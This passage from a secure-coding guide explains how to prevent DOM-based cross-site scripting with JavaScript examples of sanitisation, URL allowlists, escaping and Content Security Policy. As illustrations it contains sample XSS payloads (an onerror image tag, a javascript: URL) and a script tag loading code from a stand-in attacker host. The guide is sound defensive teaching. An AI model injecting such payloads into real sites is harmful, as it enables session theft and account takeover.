// Don't dynamically execute code
// Redesign to avoid eval

// UNSAFE
setTimeout("alert('" + input + "')", 1000);

// SAFE
setTimeout(() => alert(input), 1000);  // Function, not string

// UNSAFE
location = userInput;

// SAFE
// Validate against allowlist
const allowedUrls = ['/page1', '/page2', '/page3'];
if (allowedUrls.includes(userInput)) {
    location = userInput;
}
```

### Sanitize data before dangerous sinks

**If must use dangerous sink, sanitize input:**

**For innerHTML (HTML context):**

```javascript
// Use DOMPurify library
import DOMPurify from 'dompurify';

const userInput = new URLSearchParams(location.search).get('comment');

// Sanitize before assigning to innerHTML
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// DOMPurify removes:
// - <script> tags
// - Event handlers (onclick, onerror, etc.)
// - javascript: URLs
// - data: URLs
// - All dangerous content

// Example:
userInput = '<img src=x onerror=alert(1)>';
DOMPurify.sanitize(userInput);
// Returns: '<img src="x">'  (onerror removed)
```

**For URLs (navigation sinks):**

```javascript
// Validate against allowlist
function sanitizeUrl(url) {
    // Allow only HTTP/HTTPS
    const allowed = /^https?:\/\//i;
    
    if (!allowed.test(url)) {
        return '/'; // Default safe URL
    }
    
    // Additional checks
    if (url.includes('javascript:')) return '/';
    if (url.includes('data:')) return '/';
    
    return url;
}

const redirect = new URLSearchParams(location.search).get('next');
location.href = sanitizeUrl(redirect);
```

**For JavaScript strings:**

```javascript
// Escape special characters
function escapeJavaScript(str) {
    return str
        .replace(/\\/g, '\\\\')   // Backslash
        .replace(/'/g, "\\'")     // Single quote
        .replace(/"/g, '\\"')     // Double quote
        .replace(/\n/g, '\\n')    // Newline
        .replace(/\r/g, '\\r')    // Carriage return
        .replace(/</g, '\\x3c')   // Less than
        .replace(/>/g, '\\x3e');  // Greater than
}

const userInput = new URLSearchParams(location.search).get('name');
const safe = escapeJavaScript(userInput);

// Now safe to use in JavaScript string
eval(`setName("${safe}")`);  // Still avoid eval if possible!
```

### Content Security Policy

**CSP as defense in depth:**

```javascript
// Set CSP header
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self'; " +       // Only scripts from same origin
        "object-src 'none'; " +         // No plugins
        "base-uri 'self';"              // Prevent base tag injection
    );
    next();
});

// Even if DOM XSS exists:
eval(userInput);  // Blocked by CSP unsafe-eval restriction
location = "javascript:alert(1)";  // Blocked
<script src="//attacker.com/xss.js">  // Blocked (not same origin)
```

**CSP with nonce:**

```html
<script nonce="RANDOM_NONCE">
// Only scripts with matching nonce execute
const safe = document.createElement('div');
safe.textContent = userInput;
document.body.appendChild(safe);
</script>

<!-- This won't execute (no nonce) -->
<script>alert(1)</script>

<!-- Even if injected via DOM XSS -->
<script>
element.innerHTML = '<script>alert(1)</scr' + 'ipt>';
// Injected script has no nonce, CSP blocks it
</script>
```

### Secure coding practices

**Complete secure implementation:**

```javascript
// Good: Avoid dangerous sinks entirely
function displayUserData(userName) {
    // DON'T: innerHTML with user data
    // element.innerHTML = 'Welcome, ' + userName;
    
    // DO: textContent (interprets as text only)
    const greeting = document.createElement('div');
    greeting.textContent = 'Welcome, ' + userName;
    document.getElementById('container').appendChild(greeting);
    
    // Alternative: Template with proper escaping
    const escaped = escapeHtml(userName);
    element.innerHTML = `<div class="greeting">Welcome, ${escaped}</div>`;
}

// HTML entity encoding
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// URL validation for navigation
function safeRedirect(url) {
    // Allowlist of safe domains
    const allowedDomains = ['example.com', 'trusted-site.com'];
    
    try {
        const parsed = new URL(url, location.origin);
        
        // Only allow http/https
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return '/'; // Default safe URL
        }
        
        // Check domain allowlist
        const domain = parsed.hostname;
        if (!allowedDomains.includes(domain) && domain !== location.hostname) {
            return '/';
        }
        
        return url;
    } catch {
        return '/'; // Invalid URL
    }
}

// Usage
const redirect = new URLSearchParams(location.search).get('next');
location.href = safeRedirect(redirect);
```
